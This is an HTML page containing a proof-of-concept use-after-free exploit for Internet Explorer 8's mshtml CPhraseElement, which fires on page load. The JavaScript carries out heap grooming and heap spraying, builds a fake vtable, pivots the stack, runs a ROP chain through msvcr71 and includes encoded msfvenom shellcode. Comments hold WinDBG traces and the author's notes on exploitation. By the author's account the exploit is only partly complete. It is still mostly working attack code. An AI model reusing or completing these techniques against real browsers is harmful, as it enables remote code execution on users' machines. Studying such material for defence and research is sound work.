<!DOCTYPE html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<s>a205qiCDccqshJxNETEjZqiZ4</s>
<script language='javascript'>
/*
This is an IE8 UAF I only partially completed. This existing PoC will result in control of 2 bytes of EIP and a subsequent crash as a result.

(f54.888): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00990099 ebx=00000000 ecx=00007777 edx=00000000 esi=03d38d90 edi=03d38d90
eip=72e8008a esp=02bd9e68 ebp=02bd9ed0 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
mshtml!CElement::GetMarkupPtr+0x11:
72e8008a 8b01            mov     eax,dword ptr [ecx]  ds:002b:00007777=????????

There were several quirks that made this UAF trickier than normal:
1. The CPhraseElement object this UAF condition exploits is 0x28 in size: this
   is a very common allocation size and thus is heavily influenced by noise in
   unrelated code in the browser.
2. The UAF trigger code itself causes side-effect allocations which are the 
   same size as the UAF region (0x28 bytes). With LIFO on Windows 7, this gives
   a very high probability that the UAF will be re-claimed in the same code that
   triggers it.
3. The LFH LIFO cannot be used for a simple one-off re-claim allocation, instead
   the re-claim allocatins must be sprayed, and this re-claim itself may trigger
   side-effect allocations of the same size we aim to re-claim.
4. The UAF logic which can be used to hijack EIP utilizes a very unfortunate
   offset within the object to do so:
   
   72e80087 8b4924          mov     ecx,dword ptr [ecx+24h] <- ECX = re-claimed CPhraseElement
   72e8008a 8b01            mov     eax,dword ptr [ecx]     <- Attempts to de-reference vftable. Offset 0x24 can only contain 2 valuable bytes: the final 2 must be the NULL terminator. Thus a BSTR allocator cannot be used for re-claim.
   72e8008c 8b5020          mov     edx,dword ptr [eax+20h]
   72e8008f ffe2            jmp     edx

   Offset 0x24 in a string allocation cannot possibly hold a full absoolute
   address, as the final 2 bytes at offset 0x26 must always contain a NULL
   terminator. 
5. A non-string based allocator must therefore be used for the re-claim. I tried
   the ANIMATECURSOR allocator, however it does not play nicely with the aspect
   of the UAF which requires the document.innerHTML to be wiped.
   
My solution to the issue of noise allocations was to spray size 0x28 allocations
prior to triggering the UAF condition in order to clog any existing free chunks
of this size and ensure the LFH is activated for the desired size. Right before
the UAF condition is triggered, I free these allocations in order to achieve the
following:
- Sink hole any 0x28 allocations which may occur sa a side-effect of the UAF
  trigger code itself and decrease the change it will re-claim the region we're
  interested in.
- Sink hole any 0x28 allocations made as a side-effect of the allocator loop
  itself, which is generating DIV objects and using their className to force
  precision string allocations containing my fake CPhraseElement object without
  the BSTR length.
  
Furthermore, as this results in a large number of empty re-claimable allocation
slots of size 0x28 (including the one I actually want to re-claim), the re-claim
allocations must be spraayed in large quantity for stability of the UAF condition.

Completing this exploit would simply be a matter of finding a non-BSTR allocator
that will play nicely with the UAF trigger code on IE8.
*/

function OnResizeHandler() {
   try { document.body.attachEvent('onselectstart',OnSelectEventHandler); } catch (err) {}
   try { var Event = document.createEventObject(); } catch (err) {}
   try { document.body.fireEvent('onselectstart',Event); } catch (err) {}
}

function OnSelectHandler() {
   try { document.execCommand('InsertInputPassword',true,'img-74993_250'); } catch (err) {}
}

function OnSelectEventHandler(ev) {
    LFHArray = new Array(); // Create sink hole gaps in the heap for chunks of target 0x28 size allocated as a side-effect of the allocator itself and UAF trigger code
    CollectGarbage();
    try { ev.srcElement.innerHTML = '';} catch (err) {}
    Math.atan2(0,'------------ final re-claim spray');
    Math.cos(0);
    UafReClaim(FakeCButtonObj);
    Math.atan2(0,'------------ re-claim spray finished');
    Math.sin(0);
}

function Exploit() {
    FakeCButtonObj = CreateUafObject(DwordArrayToBytes([0x0AEB0024]), 0x28); // This object will have a BSTR length, but this trait can be removed using the DIV className trick.
    FakeCButtonObj = FakeCButtonObj.substr(0);
    ActivateLFH(FakeCButtonObj);
    var Payload = CreateFakeVtable();
    HeapSpray(Payload, 0, SprayCount);
    try { var oRange29 = document.body.createTextRange();} catch (err) {}
    try { oRange29.select(); } catch (err) {}
    
}

/*
The DIV className-based allocator gave the most reliable results. What follows are two WinDBG allocator logs for one of these allocations:

alloc(0x18) = 0x025a77f8 from 76ce9d45
free(0x025a77f8), size=0x808 from (76ce98cd)
alloc(0x30) = 0x06673f50 from 750bea43 - BSTR length 0x26: includes 4 wide char padding.
alloc(0x2c) = 0x06673b60 from 72c9abee - BSTR length 0x26: includes 4 wide char padding. Temp var (freed).
alloc(0x14) = 0x06414550 from 72e654fd
alloc(0x28) = 0x069477d0 from 72e6614e
alloc(0x40) = 0x06d04aa8 from 72e4d7d0
free(0x06673b60), size=0x4a0 from (74ed14dd)
alloc(0x50) = 0x043b1ed0 from 72e50d56
free(0x043b1ed0), size=0x130 from (74ed14dd)
alloc(0x28) = 0x069429d0 from 72e4d5bd
alloc(0x28) = 0x06948370 from 72dc0a58
alloc(0xc8) = 0x02666e10 from 76ce9d45
alloc(0x10) = 0x0691d1a8 from 750bea43
free(0x02666e10), size=0x1f0 from (76ce98cd)
alloc(0x18) = 0x025a77f8 from 76ce9d45
alloc(0x30) = 0x06673b60 from 750bea43
free(0x025a77f8), size=0x808 from (76ce98cd)
alloc(0x30) = 0x06675028 from 750bea43
alloc(0x2c) = 0x066724d8 from 72c9abee
alloc(0x14) = 0x06414510 from 72e654fd
alloc(0x28) = 0x069413e0 from 72e6614e
alloc(0x40) = 0x06d03a10 from 72e4d7d0
free(0x066724d8), size=0xb28 from (74ed14dd)

The primary sizes being created by the allocator are: 0x18, 0x30, 0x2c, 0x14,
0x28 and 0x40. There should be only one collision with a total chunk size of 0x30.
*/

var LFHArrayLen = 3000; // With an LFH/sink hole count of 1000, and a re-claim count of 3000 the exploit consistently fails. 
var LFHArray = new Array(LFHArrayLen);
var UafReClaimCount = 20000;
var UafReClaimArray = new Array(UafReClaimCount);

function ActivateLFH(Data) {
    /*
    CPhraseElement is using a factory method not a constructor. Size is 0x28
    
    0:005> uf mshtml!CPhraseElement::CreateElement
    mshtml!CPhraseElement::CreateElement:
    71d0fe0e 8bff            mov     edi,edi
    71d0fe10 55              push    ebp
    71d0fe11 8bec            mov     ebp,esp
    71d0fe13 56              push    esi
    71d0fe14 57              push    edi
    71d0fe15 6a28            push    28h
    71d0fe17 6a08            push    8
    71d0fe19 ff3518840a72    push    dword ptr [mshtml!g_hProcessHeap (720a8418)]
    71d0fe1f 33ff            xor     edi,edi
    71d0fe21 ff150013b771    call    dword ptr [mshtml!_imp__HeapAlloc (71b71300)]
    71d0fe27 8bf0            mov     esi,eax
    71d0fe29 85f6            test    esi,esi
    71d0fe2b 742d            je      mshtml!CPhraseElement::CreateElement+0x39 (71d0fe5a)
    */
    
    for (var i = 0; i < LFHArrayLen; i++){
        LFHArray[i] = document.createElement('div');
        var Temp = Data + unescape("%u7777%u7777");
        LFHArray[i].className = Temp.substr(0);
    }
}

function UafReClaim(Data) {
    for (var i = 0; i < UafReClaimCount; i++){
        UafReClaimArray[i] = document.createElement('div');
        var Temp = Data + unescape("%u7777%u7777");
        UafReClaimArray[i].className = Temp.substr(0);
    }
}

// msfvenom -p generic/custom -e x86/alpha_mixed BufferRegister=ESP BufferOffset=4 -a x86 --platform Windows -c MessageBox32.bin -o shellcode-encoded.bin PAYLOADFILE=NothingShellcode32.bin
var Shellcode = unescape("%u5954%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u5137%u6a5a%u5841%u3050%u3041%u6b41%u4141%u3251%u4241%u4232%u3042%u4242%u4241%u5058%u4138%u7542%u494a%u7061%u6c79%u506c%u6858%u6f4d%u5035%u5065%u7077%u3075%u496c%u7569%u3130%u5248%u5443%u4b4c%u3276%u7064%u4b6c%u4251%u4c54%u4b4c%u5250%u3452%u6b6e%u4263%u4876%u504c%u4f74%u576e%u6a62%u4636%u5176%u6f79%u504c%u6145%u304f%u4c6e%u704e%u6c75%u7161%u6c61%u5265%u6c64%u7065%u5159%u6f5a%u4d74%u3133%u5779%u306a%u6278%u6e58%u307a%u6b78%u5175%u6363%u6243%u4751%u706e%u6b4e%u6233%u7036%u4b6c%u4230%u6c35%u7167%u706a%u504c%u6b4e%u3057%u7870%u6b48%u7177%u5272%u454c%u306f%u6f36%u646e%u6b30%u5035%u3033%u5055%u6146%u5078%u3076%u304a%u4b4c%u3867%u7856%u4b6c%u6863%u7065%u6136%u5348%u306a%u536b%u4b51%u6962%u4b4c%u3430%u4b6c%u5145%u767a%u504c%u3130%u6f49%u7134%u5069%u4c4e%u704e%u616a%u6f4a%u4d54%u7177%u4748%u3870%u7039%u3574%u7378%u6b58%u5445%u6f36%u3051%u4466%u4d32%u7357%u4d63%u7868%u6b45%u6d51%u5457%u4553%u5a78%u706e%u7872%u706e%u6b6e%u3856%u7455%u304a%u6b68%u6546%u6c4e%u4a6c%u5253%u4258%u4c75%u6166%u5378%u706e%u5643%u6b4e%u6c76%u6b52%u4b7a%u7847%u516f%u6174%u6a73%u5059%u6344%u7462%u6f79%u3238%u4b4c%u4861%u6c67%u3133%u5338%u4b6c%u3463%u4b6c%u5135%u5058%u304a%u794f%u6432%u5457%u5447%u6b63%u6b43%u3165%u6953%u6a33%u7132%u307a%u6f59%u304d%u6853%u6f43%u5a70%u504c%u6b6e%u3262%u495a%u3056%u6f49%u4f4b%u6f59%u4d71%u304a%u6e4d%u5245%u3043%u5045%u7077%u5a43%u7043%u704e%u7871%u7057%u5034%u5035%u7067%u3636%u706e%u7a71%u5035%u304a%u5843%u4871%u446e%u7372%u455a%u4f6b%u5578%u305a%u696e%u5379%u494c%u674a%u494c%u516a%u484a%u4e30%u3033%u7067%u5065%u6e43%u6b48%u3343%u3956%u6564%u6f67%u7258%u644c%u304a%u584b%u5947%u5075%u7067%u7057%u6b58%u5875%u5245%u365a%u6d38%u3262%u6c49%u6b55%u5a4c%u4c6c%u4b6f%u7049%u4d35%u4a56%u7a37%u4872%u3639%u756e%u6d4d%u6d6f%u6f79%u756a%u6c45%u6646%u6c51%u7a57%u306b%u6b69%u7049%u4543%u7537%u6b6d%u3737%u3352%u3254%u4f32%u5a53%u3033%u5350%u4f6b%u5558%u5146%u5059%u7052%u5070%u5070%u5350%u7042%u3056%u4842%u6865%u3865%u6d66%u3652%u6f59%u356e%u5870%u6843%u5133%u7979%u3743%u3063%u7067%u5035%u586b%u4d6e%u6f79%u6f69%u6f69%u304a%u5369%u3536%u794f%u6578%u4862%u484c%u6e52%u6d76%u7047%u487a%u5370%u3043%u7067%u5065%u6850%u766f%u6773%u6d36%u7047%u5050%u6848%u546c%u5075%u5035%u5035%u7851%u3370%u3230%u7067%u3033%u3845%u7532%u3344%u4572%u3274%u6463%u4f4b%u5078%u6870%u4a55%u3838%u4634%u3033%u7062%u484a%u6c31%u7077%u5065%u3063%u6a70%u6450%u7831%u3034%u3734%u4e52%u4532%u494c%u6178%u6870%u6e70%u4542%u6431%u5065%u3845%u6f70%u6251%u3244%u4e46%u5873%u4542%u7330%u7430%u6d74%u5853%u5643%u4f42%u4233%u6231%u7831%u3744%u7750%u4743%u6e64%u496c%u324d%u6a50%u3073%u6243%u5150%u4a72%u7067%u6f79%u706a%u696e%u4c5a%u6d33%u634a%u7532%u394b%u454a%u7762%u6673%u4e4f%u7044%u7037%u5075%u7067%u3475%u4d6e%u6b4e%u5051%u4c44%u4b4c%u4833%u5854%u396b%u6e69%u5136%u5079%u4b6a%u6476%u4977%u6749%u6451%u7865%u456c%u6679%u3444%u3451%u6d4e%u6e53%u3471%u556d%u6b6b%u4433%u5444%u6b4e%u6b62%u3453%u454c%u396f%u7470%u4d64%u5a63%u3143%u7132%u7869%u4d31%u7157%u3033%u5075%u6b35%u5561%u7877%u5472%u5675%u7164%u5049%u4b6c%u5656%u6b68%u5758%u6b6e%u7643%u3052%u6e33%u4f61%u494c%u6c58%u4d51%u724b%u4454%u7057%u4561%u796f%u554b%u314b%u4c5a%u7044%u5235%u7037%u5075%u4b4c%u6532%u5835%u394b%u4550%u6839%u4b6c%u7562%u7838%u3373%u4270%u4c47%u734f%u5059%u6476%u594d%u4570%u306c%u334b%u304f%u6447%u694e%u6562%u544a%u696e%u4248%u4b6c%u3537%u6876%u4344%u6252%u3055%u6b6e%u7a33%u3455%u796f%u6d32%u304e%u496c%u6542%u6c79%u696e%u326f%u6b6e%u6532%u4854%u3363%u7263%u7075%u496c%u7573%u4c4a%u4b4c%u7542%u6c39%u6b6e%u5551%u4874%u3333%u7233%u5477%u396b%u6542%u7469%u4b4c%u5550%u6c59%u4b4c%u5571%u6876%u4354%u3267%u6c37%u394b%u5561%u487a%u6145%u5069%u596d%u7563%u506b%u594d%u6552%u4839%u6b6e%u3557%u6c59%u6b4e%u7073%u5844%u4b57%u3537%u504b%u4f34%u466c%u727a%u3053%u7067%u5035%u6b6e%u7543%u7069%u4d6c%u4c74%u456c%u5045%u5045%u3053%u7067%u4b6c%u3556%u4c4a%u6b6e%u7553%u7877%u3353%u7467%u6147%u696e%u7543%u4449%u6a70%u7037%u7042%u386d%u6d4d%u5055%u3063%u5075%u4b67%u7573%u4c44%u6f76%u554d%u716d%u5055%u3073%u7067%u4b6c%u6542%u7049%u6d6e%u3462%u5075%u6b4e%u6542%u445a%u6f46%u3778%u7437%u3253%u6d4e%u4c34%u654e%u5055%u3033%u3033%u3053%u4b6c%u5530%u6868%u6b6e%u3537%u4854%u6376%u3453%u6147%u494c%u7563%u5838%u4b6c%u6d52%u6c69%u394b%u4a68%u6336%u4571%u5058%u3970%u784b%u6c31%u4f43%u6965%u5078%u4d53%u4b73%u5769%u3557%u4859%u3033%u7047%u3063%u5035%u6165%u5959%u6d4e%u6d6f%u704a%u4d6b%u6f79%u4f6b%u6a4e%u7456%u7867%u504d%u7a48%u5065%u5462%u5077%u304b%u6a39%u4e36%u5562%u6567%u376f%u5355%u4e56%u5443%u6c50%u4c72%u634e%u4358%u6466%u4648%u4374%u5065%u6d4e%u4d6d%u707a%u6e59%u6f39%u6f69%u5131%u4b6a%u6e6b%u686e%u3362%u7163%u5371%u4b6a%u784a%u5679%u6336%u7077%u4d4c%u6d6f%u706a%u6d49%u6f79%u6f39%u7a31%u7037%u5350%u6868%u4c47%u3063%u7047%u7037%u3066%u7879%u3349%u4e4b%u6f59%u4f4b%u754f%u706b%u6471%u6974%u694e%u5551%u4c69%u7a51%u7037%u4d4c%u654f%u705a%u6e69%u6f69%u6f59%u7232%u486a%u6164%u5055%u7037%u3073%u3046%u4f6b%u7570%u6c6b%u486a%u316e%u4e6b%u4f4b%u6f69%u394b%u7533%u686b%u4b5a%u6a36%u4d4c%u3577%u7079%u6f69%u7057%u7969%u6f77%u4f4b%u6f39%u6f39%u4b4c%u7553%u4879%u394b%u6c78%u6d53%u625a%u7857%u3073%u7552%u396b%u7539%u4751%u6b6e%u4d70%u7847%u4b6c%u4d73%u6c56%u6145%u4b69%u304b%u7934%u3043%u5472%u4435%u4f54%u566e%u7177%u6c56%u3075%u4f74%u3678%u706a%u3173%u4379%u616b%u7379%u3137%u756f%u6f59%u3454%u6a38%u6172%u6b58%u574b%u696e%u786a%u6f43%u594d%u4c5a%u4d31%u326f%u6876%u5055%u4141");
var SprayCount = 400; // This is enough to consistently hit 0x0AEB0000
var SprayArray = new Array(SprayCount); // CollectGarbage will free heap sprayed chunks if this is not global.

function HeapSpray(Content, StartOffset, RegionCount) { // Spray the data specified in Content in 0x10000 chunks within 1MB allocated regions. The starting offset of the content in the 1MB chunks may be 0, or any multiple of 2.
    var PrePadding = unescape("%u1111");
    var TailPadding = unescape("%u2222");
    var Data;
    
    if(StartOffset > 0) {
        Data = PrePadding;
        
        for(var i = 0; i < ((StartOffset / 2) - 1); i++) { // -1 for var init
            Data += PrePadding;
        }
        
        Data += Content
    }
    else {
        Data = Content;
    }
    
    // These are chunks of 0x10000 bytes, then x 16 for 1MB. 0x10000 is the ideal size for heap spray as it ensures consistency, while 1MB is not (they will not always begin at a consistent 1MB multiple). 1MB chunks have a 0x20 header size, others have 0x8. 0x10000 will end up as sub-chunks within the 1MB allocations with no headers. This ensures that any multiple of 0x10000 ie. 0x11a00000, 0x11b00000, etc. will always be hit, and the payload will be at offset 0x24 within them (to accomodate 1MB header size of 0x20 + 4 byte BSTR length).
    
    while (TailPadding.length < (65536/2)) { // This is a fast way of making a large chunk
      TailPadding = TailPadding + TailPadding
    }
    
    Data = Data + TailPadding;
    
    // 65536 * 16 = 1048576 (1MB). Exclude 38 (0x26) bytes for heap chunk header (0x20 bytes), BSTR length (0x4 bytes), null terminator (0x2 bytes).
    
    var SprayChunk = Data.substr(0, 65536/2);
    
    for(var i = 0; i < 14; i++) {
        SprayChunk += Data.substr(0, 65536/2);
    }
    
    SprayChunk += Data.substr(0, (65536/2) - (38/2));
    
    for(var i = 0; i < RegionCount; i++) {
      SprayArray[i] = SprayChunk.substr(0, SprayChunk.length);
    }
}

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for (var i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function CreateUafObject(VtableAddressBytes, Size) {
    var ObjectArray = [];
    
    for (var i = 0; ObjectArray.length < (((Size - 6) / 2) - VtableAddressBytes.length); i++) { // -4 for the BSTR length and -2 for NULL terminator
        ObjectArray[i] = 0x99;
    }
    
    var FinalObject = VtableAddressBytes + String.fromCharCode.apply(null, ObjectArray);
    return FinalObject;
}

function BuildRopNopSled(RopNopAddressBytes, Size) {
    var Obj = "";
    
    while (Obj.length < (Size / 2)) {
        Obj += RopNopAddressBytes;
    }
    
    return Obj;
}

function CreateFakeVtable() {
    /*
    eax=00990099 ebx=00000000 ecx=00000c0c edx=00000000 esi=06497bb0 edi=06497bb0
    eip=72e8008a esp=02bb9e10 ebp=02bb9e78 iopl=0         nv up ei ng nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
    mshtml!CElement::GetMarkupPtr+0x11:
    72e8008a 8b01            mov     eax,dword ptr [ecx]  ds:002b:00000c0c=????????
    0:005> uf mshtml!CElement::GetMarkupPtr
    Flow analysis was incomplete, some code may be missing
    mshtml!CElement::GetMarkupPtr:
    72e47d9d 8b411c          mov     eax,dword ptr [ecx+1Ch]
    72e47da0 84c0            test    al,al
    72e47da2 0f88df820300    js      mshtml!CElement::GetMarkupPtr+0xe (72e80087)

    mshtml!CElement::GetMarkupPtr+0x7:
    72e47da8 a900010000      test    eax,100h
    72e47dad 0f85d4820300    jne     mshtml!CElement::GetMarkupPtr+0xe (72e80087)

    mshtml!CElement::GetMarkupPtr+0x18:
    72e47db3 a900020000      test    eax,200h
    72e47db8 0f84f6430500    je      mshtml!CElement::GetMarkupPtr+0x23 (72e9c1b4)

    mshtml!CElement::GetMarkupPtr+0x1f:
    72e47dbe 8b4124          mov     eax,dword ptr [ecx+24h]
    72e47dc1 c3              ret

    mshtml!CElement::GetMarkupPtr+0xe:
    72e80087 8b4924          mov     ecx,dword ptr [ecx+24h] <- ECX = re-claimed CPhraseElement
    72e8008a 8b01            mov     eax,dword ptr [ecx]     <- Attempts to de-reference vftable. Offset 0x24 can only contain 2 valuable bytes: the final 2 must be the NULL terminator. Thus a BSTR allocator cannot be used for re-claim.
    72e8008c 8b5020          mov     edx,dword ptr [eax+20h]
    72e8008f ffe2            jmp     edx

    mshtml!CElement::GetMarkupPtr+0x23:
    72e9c1b4 33c0            xor     eax,eax
    72e9c1b6 c3              ret
    
    ECX = CPhraseElement
    */
    
    var FakeVtable = BuildRopNopSled(DwordArrayToBytes([0x7C348B06]), (0x20 - 4)); // mov edx,dword ptr [eax+20h] ; jmp edx
    FakeVtable += DwordArrayToBytes([0x7C364C66]); // POP EBP ; RET  gadget to hop over stack pivot at 0xDC after ROPNOP sled
    FakeVtable += DwordArrayToBytes([0x7C348B05]); // XCHG EAX, ESP ; RET
    var Msvcr71RopChain = unescape("%u4c66%u7c36%u4c66%u7c36%u4edc%u7c34%ucfff%uffff%u1e05%u7c35%u36e3%u7c35%uffff%uffff%u5255%u7c34%u218e%u7c35%u5937%u7c34%uffc0%uffff%u1eb1%u7c35%uc5b9%u7c36%u1e67%u7c39%u2e58%u7c34%ud202%u7c34%uf8f4%u7c34%u15a2%u7c34%u4edc%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");
    FakeVtable += Msvcr71RopChain; // Non-ASLR module from Java v6.45
    FakeVtable += Shellcode;
    return FakeVtable;
}

</script>
<body onresize=eval(OnResizeHandler()) onload=eval(Exploit()) onselect=eval(OnSelectHandler())>